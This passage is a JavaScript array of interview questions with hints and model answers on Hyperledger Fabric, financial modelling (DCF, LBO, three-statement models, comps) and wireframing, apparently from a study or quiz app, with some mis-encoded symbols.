      { q:"What is Hyperledger Fabric and how does it differ from public blockchains like Ethereum?", hint:"Hyperledger Fabric: permissioned, private, enterprise blockchain. Known participants, no PoW mining, no cryptocurrency. MSP controls identity. Configurable consensus. Private data collections. Ethereum: permissionless, public, cryptocurrency.", answer:`Hyperledger Fabric is an enterprise-grade permissioned blockchain framework hosted by the Linux Foundation. The fundamental difference from public blockchains: Fabric is permissioned - every participant must be identified and authorised by a Membership Service Provider (MSP) before joining the network. There are no anonymous participants. Public blockchains like Ethereum are permissionless - anyone can join, transact, and participate in consensus without identity verification. Key distinctions: Consensus: Ethereum uses Proof of Stake requiring all validators to agree, involving thousands of unknown nodes. Fabric uses a pluggable, deterministic consensus (Raft is the production-recommended ordering service) among a known, small set of trusted orderer nodes - much higher throughput (thousands of TPS vs Ethereum's ~15-30 TPS). No cryptocurrency: Fabric has no native token. Transactions are executed by endorsed peers and do not require gas fees. Privacy: Fabric supports channels (separate ledgers for subsets of participants) and private data collections (sensitive data shared off-chain among a subset, with only its hash on the main ledger). Ethereum's base layer is fully transparent. Smart contracts are called chaincode in Fabric and can be written in Go, Java, or Node.js. Fabric smart contracts execute in Docker containers rather than a custom VM. Use cases: supply chain (Walmart Food Trust, IBM Food Trust), trade finance (we.trade), cross-bank settlement (Fnality), healthcare data sharing - where participants are known business entities that need privacy and regulatory compliance but want shared immutable records.` },
      { q:"Explain Hyperledger Fabric's key components: peers, orderers, channels, and MSP.", hint:"Peer: endorses transactions, maintains ledger/world state. Orderer: sequences transactions, produces blocks. Channel: private communication subnet with own ledger. MSP: identity management, CA certificates, roles (Admin, Member). Anchor peer for cross-org discovery.", answer:`Peers are the network nodes that host the ledger and chaincode. When a client submits a transaction proposal, endorser peers execute the chaincode, check the execution results, and return a signed endorsement. The endorsement policy (defined per chaincode) specifies which organisations must endorse a transaction - e.g., 'AND(Org1.member, Org2.member)' requires endorsement from both organisations. Committer peers validate and commit endorsed transactions to the ledger - in Fabric, all peers are committers; some are also endorsers. Orderers are responsible for transaction ordering and block creation. They receive endorsed transactions from clients, order them into a deterministic sequence, package them into blocks, and distribute blocks to all peers on the channel. Orderers do not execute chaincode or maintain the world state. Raft (CFT consensus) is the recommended production ordering service. Channels are private communication subnets within the Fabric network. Each channel has its own ledger, chaincode, and membership - organisations not on a channel cannot see its transactions or world state. Multiple business relationships can coexist on the same physical network using different channels. MSP (Membership Service Provider) manages identities. Each organisation runs a Certificate Authority (CA) that issues X.509 certificates to its members. The MSP defines which certificates are trusted, what roles they carry (Admin, Peer, Client), and the rules for identity validation. Fabric CA or external CAs (e.g., intermediate CAs from an enterprise PKI) can serve this role. Anchor peers: one peer per organisation designated to respond to gossip protocol discovery from other organisations' peers - required for cross-organisation peer discovery.` },
      { q:"How does consensus work in Hyperledger Fabric?", hint:"Three-phase: Execute (endorse) -> Order -> Validate/Commit. Not traditional BFT. Raft CFT ordering. MVCC validation: read-write sets checked for version conflicts. Endorsement policy enforcement at commit. Deterministic outcomes from deterministic chaincode.", answer:`Fabric's consensus model is distinct from blockchain consensus in public networks. It uses a three-phase execute-order-validate architecture. Phase 1 - Execute (Endorsement): the client sends a transaction proposal to the required endorser peers. Each endorser executes the chaincode against its current world state, generating a Read-Write set (the keys read and the new values to write). Endorsers sign the result and return it to the client. Crucially, chaincode is executed before ordering - this allows parallel execution and avoids non-determinism in ordering. Phase 2 - Order: the client collects sufficient endorsements (meeting the endorsement policy) and submits the endorsed transaction to the ordering service. Orderers arrange transactions into a deterministic sequence and produce blocks using Raft consensus. Raft provides Crash Fault Tolerance (CFT) - tolerates orderer node failures but assumes no Byzantine (malicious) orderer nodes. This is acceptable in Hyperledger's permissioned model where orderer identities are known and trusted. Phase 3 - Validate and Commit: peers receive blocks from orderers. For each transaction, they validate: (1) endorsement policy satisfied (correct organisations signed), (2) MVCC (Multi-Version Concurrency Control) check - the read-set versions in the transaction match the current world state versions. If another transaction already modified a key the current transaction read, the current transaction is marked invalid. Valid transactions are committed to the ledger; invalid ones are recorded as invalid but included in the block for auditability. The world state (a key-value database - LevelDB or CouchDB) is updated only with valid transactions.` },
      { q:"What is chaincode in Hyperledger Fabric and how do you develop it?", hint:"Chaincode: smart contracts in Fabric. Written in Go, Java, or Node.js. Implements shim.ChaincodeInterface: Init and Invoke. Key operations: stub.GetState, PutState, GetStateByRange, ChaincodeInvokeRequest. Testing with MockStub. Deploy: lifecycle (package, install, approve, commit).", answer:`Chaincode is the term for smart contracts in Hyperledger Fabric - it defines the business logic that reads and writes to the ledger. Chaincode runs in Docker containers on peer nodes, isolated from the peer process. Language support: Go (most common, best performance), Java, and Node.js. A Fabric chaincode implements the shim.ChaincodeInterface with two methods: Init (called on chaincode instantiation or upgrade - initialise ledger state) and Invoke (called for every transaction - routes to the appropriate business function based on the function name in the arguments). Core stub methods: stub.GetState(key) reads the current world state for a key (returns nil if not found). stub.PutState(key, value) writes a key-value pair to the world state (takes effect only if the transaction commits successfully). stub.DelState(key) removes a key. stub.GetStateByRange(startKey, endKey) performs a range query. stub.GetQueryResult(query) executes a rich query (CouchDB world state only - LevelDB does not support rich queries). stub.CreateCompositeKey constructs composite keys for related data organisation. Best practice: define a struct for each asset type, serialise/deserialise with JSON. Testing: MockStub simulates the chaincode environment for unit testing without a running Fabric network. Deployment lifecycle: (1) package the chaincode into a tar.gz, (2) install on endorsing peers, (3) each organisation approves the chaincode definition (name, version, endorsement policy), (4) commit the definition to the channel once enough organisations have approved (configurable threshold).` },
      { q:"How does Hyperledger Fabric handle privacy with channels and private data collections?", hint:"Channels: separate ledger per channel, only channel members see data. Private data collections (PDC): data shared only among subset of channel members, stored off-ledger in private databases, only hash on main ledger. Transient data for secrets not stored at all.", answer:`Fabric provides two primary privacy mechanisms beyond the baseline permissioned access control. Channels are the coarser-grained privacy mechanism - each channel is an isolated subnet with its own ledger and membership. An organisation joins a channel and gains access to all historical transactions on that ledger. Use case: in a supply chain network with retailers, distributors, and manufacturers, a channel between Manufacturer A and Retailer B keeps their pricing confidential from Manufacturer B and other retailers. Creating many channels can become administratively complex. Private Data Collections (PDC) provide finer-grained privacy within a single channel. Some fields of a transaction are designated private and distributed only to the collection members (a subset of channel organisations) off-chain via a gossip protocol directly between peers - this data is stored in a private state database on collection member peers only. The main channel ledger stores only the hash of the private data - proving the data existed and was agreed upon without revealing its content to non-members. Configuration: defined in a collections_config.json specifying the collection name, member organisations, required peer count (how many peers of each org must store it), and block-to-live (how long private data is retained). Use case: in a financial network, trade price and volume are private between the two counterparties while the trade identifier and hash are on the shared ledger for settlement. Transient data: for data so sensitive it should never be stored even in private collections (e.g., encryption keys, one-time tokens), pass it in the transient map field of the transaction proposal - accessible in chaincode via stub.GetTransient() but never written to any ledger or log.` },
      { q:"What are the main Hyperledger projects beyond Fabric?", hint:"Hyperledger Besu: EVM-compatible Ethereum for permissioned networks. Hyperledger Iroha: mobile/IoT focus, simple. Hyperledger Sawtooth: modular consensus (PoET). Hyperledger Indy: self-sovereign identity (SSI). Hyperledger Caliper: benchmarking. Hyperledger FireFly: Web3 gateway.", answer:`The Hyperledger umbrella hosts multiple blockchain and related projects for different enterprise use cases. Hyperledger Besu: an Ethereum client (EVM-compatible) designed for enterprise permissioned networks. It supports Ethereum's full EVM (Solidity smart contracts, standard tooling like Truffle and Hardhat), but can be deployed in private/permissioned mode with IBFT 2.0 (Istanbul Byzantine Fault Tolerant) or QBFT consensus instead of public PoW/PoS. Benefit: organisations can use the Ethereum developer ecosystem on a private network. Used in projects like the Baseline Protocol for enterprise ERP integration. Hyperledger Iroha: designed for mobile applications and IoT. Provides a simple command-based API for common operations (create account, add signatory, transfer asset) without requiring custom chaincode for basic asset management. YAC (Yet Another Consensus) algorithm. Hyperledger Sawtooth: modular consensus - pluggable consensus algorithms including PoET (Proof of Elapsed Time) using Intel SGX for energy-efficient leader election. Transaction families define domain logic. Hyperledger Indy: purpose-built for self-sovereign identity (SSI) and decentralised identifiers (DIDs). Enables individuals to control their own identity credentials without dependency on a central identity provider. Forms the technical foundation for Verifiable Credentials (VCs) and the W3C DID standard. Hyperledger Aries is the layer above Indy for agent-to-agent communication. Hyperledger Caliper: blockchain benchmark tool for measuring performance (TPS, latency) across different blockchain platforms including Fabric. Hyperledger FireFly: a full-stack Web3 gateway that simplifies building enterprise blockchain applications on top of Fabric, Besu, or other networks.` },
      { q:"How do you design a permissioned blockchain solution for a supply chain use case?", hint:"Identify participants and trust boundaries. Define shared vs private data. Chaincode for asset lifecycle events. Channel design. Integration with ERP/IoT. Performance: throughput vs consistency. Governance: who controls the orderer, who adds organisations.", answer:`Supply chain is the most common enterprise blockchain use case because it involves multiple independent organisations that need a shared trusted record without a central authority any party fully trusts. Design process: Participant analysis: identify all organisations (manufacturers, distributors, logistics providers, retailers, regulators), their roles, and what data they need to share and what must remain private. Trust boundaries: which pairs of organisations have commercial sensitivity about their relationship? This drives channel design. Asset and event model: define the assets (product, shipment, certificate) and lifecycle events (created, shipped, received, quality-checked, recalled). Each event is a transaction updating the asset state on the ledger - immutable audit trail from origin to shelf. Chaincode design: one or more chaincode packages defining asset CRUD operations, business rules (cannot mark as received without a prior ship event), and access control (only the current custodian can update the asset state). Data privacy: product price and commercial terms between manufacturer and retailer go in a PDC; the asset identifier and custody transfer events go on the main ledger visible to all (including regulators). Integration: IoT sensors and RFID readers emit events that trigger chaincode invocations via an API gateway. ERP systems (SAP, Oracle) integrate via REST APIs or event-driven middleware (IBM Integration Bus, MuleSoft). Performance: Fabric handles thousands of TPS - typical supply chain event rates are low enough that performance is not the primary concern; consistency and data integrity are. Governance: define upfront who operates the orderer (neutral party, consortium), the process for adding/removing organisations, and the process for upgrading chaincode. Governance failures (disagreements about who controls the orderer) have derailed real-world blockchain consortia.` },
    ],
    'financial modeling': [
      { q:"What is a three-statement financial model and how do the income statement, balance sheet, and cash flow statement link?", hint:"Income statement -> net income -> retained earnings (equity). Cash flow from operations (CFO) starts with net income. D&A: non-cash add-back in CFO, capex on cash flow from investing. Ending cash on CF = cash on balance sheet. Circular: interest expense depends on debt balance.", answer:`A three-statement model integrates all three financial statements into a dynamic, formula-driven model where changes flow through automatically. Income Statement flows into the Balance Sheet: Net income increases retained earnings in shareholders' equity (net income - dividends paid = addition to retained earnings). Cash Flow Statement starts with net income and adjusts for non-cash items and working capital changes. Key linkages: Depreciation and Amortisation (D&A) is a non-cash expense on the income statement - it reduces net income but does not consume cash. In the cash flow from operations (CFO) section, D&A is added back. D&A also reduces the net PP&E (Property, Plant & Equipment) balance on the balance sheet each period. Capital Expenditures (Capex) appear as a cash outflow in investing activities and increase gross PP&E on the balance sheet. Working capital changes: an increase in accounts receivable (customer owes more money) is a use of cash - subtracted in CFO. An increase in accounts payable is a source of cash - added in CFO. Ending cash: the net change in cash from CFO + CFI + CFF equals the change in the cash line on the balance sheet. The balance sheet must balance: Assets = Liabilities + Equity. Circular reference: interest expense on the income statement depends on average debt balance, which depends on cash available to repay debt, which depends on net income after interest expense. Models handle this with Excel's iterative calculation setting or by using beginning-of-period debt to calculate interest.` },
      { q:"How do you build a DCF (Discounted Cash Flow) valuation model?", hint:"Project free cash flows (FCFF or FCFE) for 5-10 years. Terminal value: Gordon Growth Model or exit multiple. Discount at WACC (for FCFF) or cost of equity (for FCFE). Enterprise value - net debt = equity value. Sensitivity on WACC and terminal growth rate.", answer:`A DCF values a business as the present value of all future free cash flows. Step 1 - Project Free Cash Flows: build a 5-10 year forecast of revenues (top-down: market size Ã— market share, or bottom-up: units Ã— price) with explicit assumptions for margins, capex, and working capital. Free Cash Flow to Firm (FCFF) = EBIT Ã— (1 - tax rate) + D&A - Capex - change in net working capital. This is the cash flow available to all capital providers (debt and equity) before financing. Step 2 - Terminal Value: beyond the explicit forecast period, assume the business grows at a steady-state rate. Gordon Growth Model: Terminal Value = FCF_(n+1) / (WACC - g), where g is the long-term growth rate (typically GDP growth, 2-3%). Exit Multiple method: Terminal Value = EBITDA_n Ã— EV/EBITDA multiple (based on comparable companies). The terminal value typically represents 60-80% of the total enterprise value - making it the most important and most sensitive assumption in the model. Step 3 - Discount at WACC: WACC = (E/V Ã— Ke) + (D/V Ã— Kd Ã— (1-t)), where Ke is the cost of equity (CAPM: Rf + Î² Ã— ERP), Kd is the pre-tax cost of debt, t is the tax rate, E and D are market values of equity and debt, V = E + D. Step 4 - Enterprise Value to Equity Value Bridge: Enterprise Value = sum of PV(FCFFs) + PV(Terminal Value). Equity Value = Enterprise Value - Net Debt (debt - cash) - minority interests + associate investments. Equity Value per share = Equity Value / diluted shares outstanding. Sensitivity table: always present a sensitivity matrix of equity value vs WACC (rows) and terminal growth rate (columns).` },
      { q:"Explain sensitivity analysis and scenario analysis in financial modelling.", hint:"Sensitivity: one or two variables change (data table). Scenario: coherent set of assumptions change together (bull/base/bear). Tornado chart: rank input variables by impact. Monte Carlo: probability distribution over many simulations. Output: range of values rather than single point estimate.", answer:`Both techniques address model uncertainty - a single-point valuation output implies false precision, because every assumption in a model is an estimate. Sensitivity analysis isolates the impact of changing one or two input variables while holding everything else constant. In Excel, a one-variable data table tests a range of values for one input (e.g., revenue growth rate from 2% to 12%) and shows the resulting output (equity value). A two-variable data table tests two inputs simultaneously - the standard WACC vs terminal growth rate matrix in a DCF. Tornado chart: run a one-at-a-time sensitivity analysis on all key inputs, varying each by the same percentage (e.g., ±10%). Rank variables by their impact on the output - the widest bar is the most sensitive. This communicates which assumptions most deserve scrutiny and management focus. Scenario analysis changes a coherent set of related assumptions together to represent a plausible future state. Base case: management plan assumptions. Bull case: strong macroeconomic environment, market share gains, margin expansion. Bear case: recession, competitive pressure, margin contraction. Each case has internally consistent assumptions (revenue growth, margin, capex) - it does not make sense to combine high revenue growth (bull) with high margins (bull) and high capex (bear). Output: a range of values across scenarios, not a single number. Monte Carlo simulation: uses probability distributions for each input (e.g., revenue growth normally distributed with mean 7%, standard deviation 3%) and runs thousands of simulations, producing a probability distribution of outcomes. More sophisticated than sensitivity/scenario but requires assumptions about input distributions and correlations.` },
      { q:"What is an LBO model and when is it used?", hint:"LBO: acquisition financed largely with debt. Returns driven by: EBITDA growth, multiple expansion, debt paydown (deleveraging). Model: purchase price (entry multiple), capital structure (debt tranches), operating model, exit (exit multiple Ã— exit EBITDA). IRR and MOIC for returns.", answer:`A Leveraged Buyout (LBO) model is used by private equity firms to assess the potential returns from acquiring a company using significant debt financing. The core insight of an LBO: using debt to finance the acquisition amplifies equity returns (if successful) because the equity investor puts in less capital. A business acquired for 10Ã— EBITDA is purchased with 6Ã— EBITDA of debt and 4Ã— of equity. If the business is sold 5 years later for the same 10Ã— multiple with EBITDA 50% higher, the equity value has grown from 4Ã— EBITDA to 10Ã— - a 2.5Ã— return, all from operational improvement. Model structure: Purchase price = entry EV/EBITDA multiple Ã— LTM EBITDA. Sources and uses table: Uses = equity purchase price + fees + refinanced debt. Sources = new debt tranches (senior secured, second lien, mezzanine, PIK) + equity from the PE fund. Operating model: project revenues, EBITDA, D&A, capex, and working capital for the hold period (typically 3-7 years). Debt schedule: model each debt tranche's interest rate (senior at SOFR + spread, mezz at fixed), mandatory amortisation, and cash sweep (excess cash used to repay debt - 'deleveraging'). Exit: terminal year EBITDA Ã— exit multiple = exit enterprise value. Equity to sponsors = exit EV - remaining debt. Returns metrics: MOIC (Multiple on Invested Capital) = exit equity / entry equity. IRR (Internal Rate of Return) = annualised return on equity investment. Target IRR for PE is typically 20-25%+. Three return drivers: (1) EBITDA growth, (2) multiple expansion (buying at 8Ã— and selling at 10Ã—), (3) debt paydown - deleveraging increases equity value as debt decreases.` },
      { q:"What are best practices for financial model structure and layout?", hint:"Inputs separate from calculations separate from outputs. Colour coding: blue for hardcoded inputs, black for formulas, green for links. No hardcoded numbers in formulas. Version control. Error checks (balance sheet balances, cash flow ties). Circularity flag. Named ranges.", answer:`A financial model is useless if it cannot be audited, updated, or trusted. Structural principles: separate inputs from calculations from outputs. A dedicated Inputs (or Assumptions) sheet holds all hardcoded values - revenue growth rates, margin assumptions, tax rates, discount rates. Calculation sheets perform the modelling logic. Output sheets (Summary, Charts) present results. This separation means updating an assumption requires changing one cell in one place - not hunting through formulas. Colour coding is the universal convention: blue for hardcoded inputs (values you type in), black for formulas derived from calculations, green for links to other sheets. Any reviewer knows immediately which cells drive the model and which are derived. No hardcoded numbers in formulas: a formula like =B5*0.21 is unacceptable - the 0.21 should be an input cell referenced as =B5*tax_rate_assumption. Hardcoded numbers in formulas are invisible to reviewers and impossible to change consistently. Error checks: the balance sheet must balance (Assets = Liabilities + Equity) - add a balance check row and conditional formatting that turns red if it does not. Ending cash on the cash flow statement must equal cash on the balance sheet - add this check. Circularity flag: if the model has circular references (interest expense -> net income -> debt paydown -> debt balance -> interest expense), add a circular reference flag cell and a toggle to break the circularity for auditing. Version control: save dated versions (Model_v1.0_2024-03-15.xlsx) and maintain a change log tab documenting what changed and why.` },
      { q:"How do you build a comparable company analysis (trading comps)?", hint:"Select 8-12 comparable companies. Spread financials: EV/EBITDA, EV/Revenue, P/E. Calculate EV = market cap + net debt. Normalise for one-time items. Apply median or quartile multiples to target EBITDA/Revenue. Football field chart.", answer:`Comparable company analysis (trading comps) values a target company relative to similar publicly traded peers - the market's revealed preference for similar businesses. Step 1 - Select comparables: identify 8-15 publicly traded companies similar to the target in: industry/sector, business model, size (revenue, market cap), geography, growth profile, and margins. Avoid including companies that are themselves subject to M&A rumours (their prices may reflect acquisition premium, not standalone value). Step 2 - Spread financials: for each comparable, collect: Market Capitalisation (shares outstanding Ã— share price). Net Debt = total debt + preferred equity + minority interests - cash. Enterprise Value (EV) = market cap + net debt. LTM (Last Twelve Months) and forward estimates for Revenue, EBITDA, EBIT, and net income. Calculate multiples: EV/Revenue (LTM and NTM), EV/EBITDA (LTM and NTM - most commonly used), EV/EBIT, P/E (forward). Step 3 - Normalise: remove one-time items from EBITDA (restructuring charges, litigation settlements, impairment) to reflect recurring earnings power. Step 4 - Valuation: calculate the median and 25th/75th percentile of each multiple. Apply to the target's EBITDA: if comparable EV/EBITDA median is 10Ã—, and target EBITDA is $50M, implied EV is $500M. Apply multiple multiples and show the range. Step 5 - Football field chart: a horizontal bar chart showing the valuation range from each methodology (DCF, trading comps, precedent transactions) - communicates the range of value estimates clearly.` },
      { q:"How do you model working capital and understand its impact on cash flow?", hint:"Working capital = current assets (AR, inventory) - current liabilities (AP, accrued expenses). Increase in AR or inventory = cash outflow. Increase in AP = cash inflow. DSO (Days Sales Outstanding), DIO, DPO drive working capital. Working capital as % of revenue for projections.", answer:`Working capital (WC) represents the cash tied up in the operating cycle - collecting receivables, holding inventory, and timing payments to suppliers. Net Working Capital = Current Operating Assets (accounts receivable + inventory + prepaid expenses) - Current Operating Liabilities (accounts payable + accrued expenses + deferred revenue). Cash flow impact: an increase in accounts receivable means customers owe more money - revenue was recognised but cash has not been received. This is a use of cash in the operating period. Conversely, an increase in accounts payable means the company is paying suppliers more slowly - delaying cash outflows. This is a source of cash. Working capital metrics: DSO (Days Sales Outstanding) = AR / Revenue Ã— 365 - how many days it takes to collect receivables. High DSO = slow collections. DIO (Days Inventory Outstanding) = Inventory / COGS Ã— 365 - days of inventory on hand. DPO (Days Payable Outstanding) = AP / COGS Ã— 365 - days taken to pay suppliers. Cash Conversion Cycle = DSO + DIO - DPO - the net number of days cash is tied up in operations. Lower CCC = more efficient. For modelling: project AR, inventory, and AP as a percentage of revenue or COGS, or by explicit DSO/DIO/DPO assumptions. A company growing rapidly will have increasing working capital - it is collecting more receivables and holding more inventory - which is a cash drain even as profits grow. Working capital release (WC decreasing as % of revenue) can be a significant source of cash in a declining or restructuring business.` },
    ],
    wireframing: [
      { q:"What is the difference between wireframes, mockups, and prototypes?", hint:"Wireframe: low-fidelity structural layout (boxes, lines, no colour/imagery). Mockup: high-fidelity visual design (colour, typography, final look). Prototype: interactive (clickable flows). Progressive fidelity as design matures and assumptions are validated.", answer:`The three artefacts represent progressively increasing fidelity and investment in the design process. Wireframes are low-fidelity representations of a screen's structure and layout - grey boxes for images, placeholder text, simple rectangles for buttons. They communicate information architecture (what goes where), hierarchy (which elements are primary vs secondary), and flow (how screens connect) without visual design decisions. Created quickly in Figma, Balsamiq, or even on paper. Purpose: align on structure before investing in visual design. Mockups are high-fidelity visual designs that show exactly how the final product will look - real colours, typography, iconography, spacing, and imagery. They do not behave - no interactivity. Created in Figma, Sketch, or Adobe XD. Purpose: align stakeholders on visual direction, get design approval, enable developers to understand final visual specifications. Prototypes add interactivity - clicking a button navigates to the next screen, forms respond to input, animations play. Fidelity varies: low-fidelity prototypes (paper or clickable wireframes) test navigation flows; high-fidelity prototypes (in Figma) test the complete user experience including micro-interactions. Purpose: user testing, stakeholder demos, developer reference for interactions. Progressive fidelity is intentional: validate the structure (wireframe) before committing to visual design (mockup) before building interactivity (prototype). Skipping straight to high-fidelity mockups before validating structure wastes effort - if user testing reveals the navigation structure is wrong, high-fidelity visual work is discarded.` },
      { q:"Walk me through your wireframing process from brief to stakeholder sign-off.", hint:"1. Understand goals and user needs. 2. Competitive audit and design patterns. 3. Sketching/ideation (paper). 4. Low-fidelity wireframes (Figma/Balsamiq). 5. Internal critique. 6. Stakeholder presentation. 7. Iterate. 8. Sign-off on structure before moving to visual design.", answer:`A structured wireframing process prevents rework and builds shared understanding. Phase 1 - Discovery: before drawing anything, understand the goals. What business problem does this screen solve? Who is the user, and what are they trying to accomplish? What are the success metrics? Review any existing research (user interviews, analytics, heatmaps). Brief clarification: if the brief says 'design a checkout flow', understand the constraints - which payment methods must be supported, are there legal requirements, what is the error handling strategy? Phase 2 - Research and patterns: audit competitors and design pattern libraries (Material Design, Apple HIG, Mobbin) to understand established patterns for the problem type. Identify which patterns to adopt (reducing cognitive load for users familiar with conventions) vs innovate. Phase 3 - Ideation: sketch multiple solutions on paper quickly - paper's low cost enables divergent thinking. Do not commit to the first idea. Generate 5-10 rough sketches. Phase 4 - Low-fidelity wireframes: translate the most promising sketches into digital wireframes. Use a consistent wireframe kit (standardised components for buttons, inputs, navigation) for speed. Annotate key decisions and interactions. Phase 5 - Internal critique: share with the team - developers identify technical constraints, product managers challenge scope, other designers review UX patterns. Phase 6 - Stakeholder presentation: present wireframes with the context of the user problem and design rationale. Focus on structure and flow, explicitly note that visual design follows later. Phase 7 - Iterate: incorporate feedback. Phase 8 - Sign-off: get written or documented approval before investing in mockup-level fidelity.` },
      { q:"What tools do you use for wireframing and why?", hint:"Figma: industry standard, real-time collaboration, component libraries, prototyping, handoff. Balsamiq: deliberately rough sketchy style signals low fidelity. Miro/FigJam: whiteboard for early ideation and flows. Axure: complex interactions and conditional logic. Pen and paper: fastest ideation.", answer:`Tool choice depends on fidelity, collaboration needs, and stage of the design process. Figma is the current industry standard for wireframing through to high-fidelity mockups and prototyping. Key advantages: real-time multiplayer collaboration (stakeholders can comment directly on designs), robust component and variant system (build a wireframe kit once, reuse consistently), built-in prototyping (link frames to create clickable flows without leaving the tool), and dev handoff (inspect panel provides CSS properties, spacing, and assets to developers). Figma Community has hundreds of free wireframe kits. Balsamiq: its deliberately rough, sketchy visual style is a feature - it signals explicitly to stakeholders that this is a work in progress, preventing feedback on colours and typography at the wireframing stage. Well-suited when stakeholders confuse wireframes with final designs. Miro and FigJam (Figma's whiteboard): ideal for early-stage collaborative workshops - mapping user journeys, creating affinity diagrams, drawing rough flow diagrams. Not suited to detailed wireframing but excellent for the ideation phase before wireframing. Axure RP: handles complex interactions, conditional logic, and dynamic content that Figma prototyping cannot - adaptive views, data-driven content, complex state management. Used for highly interactive products or enterprise tools with complex workflows. Pen and paper: the fastest tool for ideation. No software friction allows unconstrained thinking - use paper for the first divergent phase, then move to digital.` },
      { q:"How do you wireframe for responsive design across breakpoints?", hint:"Mobile-first approach: design smallest screen first, progressively enhance for larger screens. Define breakpoints: mobile (320-767px), tablet (768-1023px), desktop (1024px+). Grid system: 4-column mobile, 8-column tablet, 12-column desktop. Content priority: what stays vs hides vs reflows.", answer:`Responsive wireframing requires designing the same content for multiple viewport widths. Mobile-first approach: design the mobile wireframe first, which forces prioritisation - limited screen space requires deciding what is essential. Then progressively enhance for larger viewports. If you design desktop-first, mobile often becomes a compromised afterthought. Breakpoints: define the key breakpoints for the product (commonly mobile < 768px, tablet 768-1024px, desktop > 1024px). Create wireframes at each breakpoint - not just desktop. Grid system: a 4-column grid for mobile provides structure for alignment; 8 columns for tablet; 12 columns for desktop. Figma's Layout Grid feature applies the grid to each frame at the appropriate breakpoint. Content decisions at each breakpoint: Navigation: hamburger menu on mobile -> horizontal navigation bar on desktop. Sidebar: stacks below main content on mobile -> side-by-side on desktop. Images: full-width on mobile -> float right on desktop. Data tables: horizontally scrollable on mobile -> full table on desktop. Content priority: some elements are hidden on mobile (secondary sidebar, decorative imagery) - document these decisions explicitly in wireframe annotations. Fluid vs fixed: between breakpoints, columns either stretch fluidly (percentage widths) or snap to the next breakpoint - document the behaviour. Interaction changes: tap targets on mobile require minimum 44Ã—44px for touch; hover states on desktop do not translate to touch - document which hover interactions need alternative touch interactions.` },
      { q:"How do you incorporate user feedback into wireframe iterations?", hint:"Usability testing on low-fidelity wireframes (think-aloud protocol). 5 users reveal 80% of issues (Nielsen). Observe where users hesitate, mis-click, or express confusion. Affinity mapping of findings. Prioritise by severity and frequency. Document decisions in changelog.", answer:`User testing on wireframes is the most cost-effective point in the design process - changing a wireframe takes minutes; changing developed code takes hours or days. Testing approach: recruit 5 users representative of the target persona (Nielsen's research shows 5 users reveal approximately 85% of usability issues). Use think-aloud protocol: give users a task ('Book a table for 2 people this Saturday') and ask them to narrate their thoughts as they navigate the wireframe prototype. Do not help them when they struggle - confusion and errors are the data. Observation: note where users hesitate (unexpected interaction model), mis-tap or look for something in the wrong place (navigation mismatch), express confusion ('I expected this to...'), or give up on the task. Session recording (Maze, Lookback, UserZoom) captures click paths and heatmaps on the prototype. Synthesis: use affinity mapping to cluster observations into themes - if 4 of 5 users struggled to find the 'Help' link, that is a priority finding. Severity rating: critical (prevents task completion), serious (causes significant difficulty), minor (cosmetic or small friction). Prioritisation: fix critical issues before proceeding to mockup; address serious issues in the current wireframe iteration; log minor issues for later. Documentation: maintain a changelog in the design file - document what changed between iterations and why (citing specific user feedback). This creates institutional memory and helps stakeholders understand why earlier decisions were changed.` },
      { q:"How do wireframes communicate interaction patterns and micro-interactions?", hint:"Annotations: numbered callouts explaining behaviour. Interaction notes: on-hover states, validation states, empty states, error states. Flow arrows between frames in prototyping tools. State diagrams for complex components. Interaction inventory for handoff.", answer:`Wireframes communicate not just layout but behaviour - developers need to understand what happens when users interact with each element. Annotations are the primary communication tool: numbered callouts or text labels beside elements explaining: 'Clicking this button submits the form and navigates to the confirmation screen' or 'This dropdown populates dynamically from the user's saved addresses'. Keep annotations separate from the visual wireframe (use a side panel or annotation layer) so they do not clutter the design. State documentation: for each interactive component, document all states. Input fields: default, focus (cursor active), filled, error (failed validation), disabled. Buttons: default, hover, active/pressed, loading, disabled. Modals: open trigger, close (X, ESC, click outside). Empty states: what does the screen look like when there is no data (first-time user, no results)? Empty states are frequently omitted and create developer confusion. Error states: validation messages, server errors, network failure states. Prototype links: in Figma, link frames together to demonstrate key flows - clicking the CTA navigates to the next screen. This communicates transitions even without animating them. Flow notation: numbered screens with directional arrows in a flow diagram communicate the complete user journey across screens. Interaction inventory: a table listing every interactive element, its trigger (click, hover, swipe), and its action - useful for developer handoff to ensure no interaction is missed. Complex components (date pickers, multi-step forms, drag-and-drop) warrant their own state diagrams.` },
      { q:"What accessibility considerations belong in the wireframing phase?", hint:"WCAG 2.1 AA minimum standard. Focus order: logical tab sequence. Heading hierarchy (H1 > H2 > H3). Landmark regions. Touch target size (44Ã—44px minimum). Alternative text annotations for images. Form labels. Colour contrast (defer to mockup phase). Skip navigation.", answer:`Accessibility is significantly cheaper to design in at the wireframe stage than to retrofit in development. Structural accessibility decisions are made at wireframe fidelity. Heading hierarchy: annotate the semantic heading level for every text element - H1 for the page title, H2 for major sections, H3 for sub-sections. Screen readers and assistive technologies use heading structure for navigation. A flat heading structure (all H2) or skipped levels (H1 -> H3) creates confusion. Landmark regions: annotate ARIA landmarks - header, nav, main, aside, footer. These allow screen reader users to jump directly to the main content or navigation. Focus order: define the logical tab sequence for keyboard navigation. The visual layout and the tab order should match - an unexpected focus jump confuses keyboard users. Document this in annotation: 'Tab order follows reading order: 1->2->3->4'. Form labels: every form input requires a visible label - not placeholder text alone (which disappears on focus and is insufficient for accessibility). Annotate label text and association explicitly. Touch targets: minimum 44Ã—44px interactive area for all touch targets (WCAG 2.5.5, Apple HIG, Google Material). Annotate any element smaller than this. Alternative text: annotate every image with its intended alt text - decorative images (alt=''), informational images (descriptive alt), and functional images like icon-only buttons ('Close dialog'). Skip navigation: include a 'Skip to main content' link as the first focusable element - allows keyboard users to bypass repetitive navigation on every page. Colour contrast (AA minimum: 4.5:1 for normal text, 3:1 for large text) is evaluated at mockup stage when colours are defined.` },
    ],
    'data engineering': [
